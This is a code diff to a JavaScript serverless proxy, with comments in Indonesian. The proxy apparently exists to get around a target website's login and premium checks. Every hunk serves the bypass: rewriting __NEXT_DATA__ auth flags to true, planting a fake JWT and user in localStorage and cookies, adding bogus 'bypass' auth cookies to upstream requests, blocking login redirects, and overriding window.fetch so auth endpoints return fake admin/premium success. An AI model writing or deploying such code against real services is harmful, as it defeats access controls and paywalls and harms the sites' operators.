@@ -42,7 +42,6 @@ function spoofNextData(html) {
       try {
         const data = JSON.parse(jsonText);
         
-        // Rekursif: ubah semua flag auth jadi true di semua level
         function flip(obj) {
           if (!obj || typeof obj !== "object") return;
           for (const k of Object.keys(obj)) {
@@ -63,14 +62,15 @@ function spoofNextData(html) {
         }
         flip(data);
 
-        // Timpa juga pageProps.user biar React punya data
         if (data.props && data.props.pageProps) {
           data.props.pageProps.user = JSON.parse(fakeUser);
           data.props.pageProps.isLoggedIn = true;
           data.props.pageProps.token = fakeToken;
         }
 
-        return `<script id="__NEXT_DATA__" type="application/json">${JSON.stringify(data)}</script>`;
+        // Escape '<' biar JSON nggak ngerusak tag <script>
+        const safeJson = JSON.stringify(data).replace(/</g, '\\u003c');
+        return `<script id="__NEXT_DATA__" type="application/json">${safeJson}</script>`;
       } catch (e) {
         return match;
       }
@@ -89,8 +89,9 @@ function stripCookieDomain(cookie) {
 function buildClientScript() {
   return `
   <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-  <script>eruda.init();</script>
-  <script>(function(){
+  <script>try { eruda.init(); } catch(e) {}</script>
+  <script>
+  (function(){
     var FAKE_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
     try {
       localStorage.setItem('token', FAKE_JWT);
@@ -99,17 +100,16 @@ function buildClientScript() {
       document.cookie = "token=" + FAKE_JWT + "; path=/";
     } catch(e){}
 
-    // Blokir redirect
     var _rep = location.replace.bind(location);
-    location.replace = function(u){ if(u === "/" || /\/login/.test(u)) return; _rep(u); };
+    location.replace = function(u){ if(u === "/" || /\\/login/.test(u)) return; _rep(u); };
+    
     var _push = history.pushState;
-    history.pushState = function(s,t,u){ if(u === "/" || /\/login/.test(u)) return; _push.apply(this, arguments); };
+    history.pushState = function(s,t,u){ if(u === "/" || /\\/login/.test(u)) return; _push.apply(this, arguments); };
 
-    // Fake API
     var _f = window.fetch;
     window.fetch = function(i, init){
       var u = typeof i === "string" ? i : (i ? i.url : "");
-      if (/\/api\/|verify|auth|login|check|user|me/i.test(u)) {
+      if (/\\/api\\/|verify|auth|login|check|user|me/i.test(u)) {
         return Promise.resolve(new Response(JSON.stringify({
           status:"success", valid:true, success:true, authenticated:true, token:FAKE_JWT,
           user: {id:"1", name:"Nexus", premium:true, role:"admin"}, 
@@ -118,7 +118,8 @@ function buildClientScript() {
       }
       return _f.call(this, i, init);
     };
-  })();</script>`;
+  })();
+  </script>`;
 }
 
 export default async function handler(req, res) {
@@ -126,15 +127,15 @@ export default async function handler(req, res) {
 
   try {
     let path = (req.query.path || "").replace(/^\/+/, "");
+    
     if (path.startsWith("api/proxy")) {
       path = path.replace("api/proxy", "");
       if (path.startsWith("?")) path = path.substring(1);
     }
 
-    // Root diarahin ke /home biar nggak nampilin form login kosong
+    // LANGSUNG TEMBAK /home KALAU LU BUKA ROOT
     if (!path) {
-      res.writeHead(302, { Location: "/home", "Cache-Control": "no-store" });
-      return res.end();
+      path = "home"; 
     }
 
     const searchParams = new URLSearchParams();
@@ -151,7 +152,6 @@ export default async function handler(req, res) {
       fwd[k] = value;
     }
     fwd["origin"] = TARGET_ORIGIN;
-    // Pura-pura punya cookie auth yang valid
     fwd["cookie"] = (fwd["cookie"] ? fwd["cookie"] + "; " : "") + "token=bypass; session=bypass; auth=true";
     if (req.headers["referer"]) {
       fwd["referer"] = req.headers["referer"].replace(`https://${req.headers["host"]}`, TARGET_ORIGIN);
@@ -164,7 +164,6 @@ export default async function handler(req, res) {
     else { const single = upstream.headers.get("set-cookie"); if (single) setCookies = [single]; }
     if (setCookies.length) res.setHeader("set-cookie", setCookies.map(stripCookieDomain));
 
-    // Jangan biarin server nge-redirect balik ke / atau /login
     if ([301, 302, 303, 307, 308].includes(upstream.status)) {
       const loc = upstream.headers.get("location") || "/";
       if (loc === "/" || loc === "" || loc.includes("login")) {
@@ -180,11 +179,10 @@ export default async function handler(req, res) {
     if (ct.includes("text/html")) {
       let html = await upstream.text();
 
-      // URUTAN PENTING: bajak __NEXT_DATA__ DULU sebelum React hydrate
       html = spoofNextData(html);
       html = renameInHtmlTextNodes(html);
 
-      const script = buildClientScript();
+      const script = "\n" + buildClientScript(); // Kasih newline biar nggak nyambung ke script React
       html = /<\/body>/i.test(html) ? html.replace(/<\/body>/i, () => script + "</body>") : html + script;
 
       res.statusCode = upstream.status;
